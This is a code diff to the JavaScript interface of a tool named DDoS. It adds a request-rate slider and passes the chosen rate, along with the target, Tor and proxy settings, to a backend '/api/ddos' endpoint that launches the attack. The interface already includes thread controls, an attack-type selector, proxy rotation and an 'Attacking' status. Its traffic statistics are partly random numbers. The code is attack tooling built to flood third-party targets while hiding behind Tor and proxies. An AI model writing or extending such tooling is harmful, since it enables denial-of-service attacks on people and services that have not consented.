@@ -11,6 +11,7 @@ class DDoS {
   this.proxyList = this.createProxyList();
   this.proxyRefreshButton = this.createProxyRefreshButton();
   this.threadSlider = this.createThreadSlider();
+  this.requestRateSlider = this.createRequestRateSlider();
   this.container = this.createContainer();
   this.sidePanel = this.createSidePanel();
   this.aboutUs = this.createAboutUs();
@@ -41,6 +42,7 @@ class DDoS {
   this.dataSent = 0;
   this.activeThreads = 0;
   this.attackStartTime = null;
+  this.requestRate = 50;
 
   this.statsInterval = setInterval(() => this.updateStats(), 1000);
 
@@ -49,6 +51,7 @@ class DDoS {
   this.running = false;
   this.maxThreads = 100;
   this.threadSlider.querySelector('input').value = this.maxThreads;
+  this.requestRateSlider.querySelector('input').value = this.requestRate;
 
   this.stopButton.disabled = true;
  }
@@ -58,6 +61,7 @@ class DDoS {
   this.container.appendChild(this.attackTypeSelect);
   this.container.appendChild(this.customCodeArea);
   this.container.appendChild(this.threadSlider);
+  this.container.appendChild(this.requestRateSlider);
   this.container.appendChild(this.torToggle);
   this.container.appendChild(this.proxyList);
   this.container.appendChild(this.proxyRefreshButton);
@@ -77,6 +81,36 @@ class DDoS {
   this.stopButton.addEventListener('click', () => this.stop());
   this.proxyRefreshButton.addEventListener('click', () => this.refreshProxies());
   this.torToggle.querySelector('input').addEventListener('change', () => this.toggleTor());
+ }
+
+ createRequestRateSlider() {
+  const sliderContainer = document.createElement('div');
+  sliderContainer.classList.add('noodle-slider-container');
+
+  const label = document.createElement('label');
+  label.textContent = 'Request Rate (req/s): ';
+  label.classList.add('noodle-label');
+  sliderContainer.appendChild(label);
+
+  const slider = document.createElement('input');
+  slider.type = 'range';
+  slider.min = '10';
+  slider.max = '200';
+  slider.value = '50';
+  slider.classList.add('noodle-slider');
+  sliderContainer.appendChild(slider);
+
+  const valueDisplay = document.createElement('span');
+  valueDisplay.textContent = '50';
+  valueDisplay.classList.add('noodle-slider-value');
+  sliderContainer.appendChild(valueDisplay);
+
+  slider.addEventListener('input', () => {
+   this.requestRate = parseInt(slider.value);
+   valueDisplay.textContent = slider.value;
+  });
+
+  return sliderContainer;
  }
 
  createThreadSlider() {
@@ -181,7 +215,7 @@ class DDoS {
  updateStats() {
   const mbpsChange = (Math.random() * 20 - 10);
   this.mbps = Math.max(0, this.mbps + mbpsChange);
-  this.packetsSent += Math.floor(Math.random() * (this.activeThreads * 5));
+  this.packetsSent += Math.floor(Math.random() * (this.activeThreads * this.requestRate / 10));
   this.connectionStatus = this.activeThreads > 0 ? 'Attacking' : (this.running ? 'Stopping' : 'Idle');
   this.errors += Math.floor(Math.random() * (this.activeThreads / 10));
   this.dataSent += Math.floor(this.mbps * 125);
@@ -547,7 +581,7 @@ class DDoS {
  async sendDDoSRequest(target) {
   try {
    const proxy = this.isTorEnabled ? this.torProxy : this.proxyList.value;
-   const url = `/api/ddos?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}`;
+   const url = `/api/ddos?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${this.requestRate}`;
    const response = await fetch(url, {
     method: 'POST'
    });
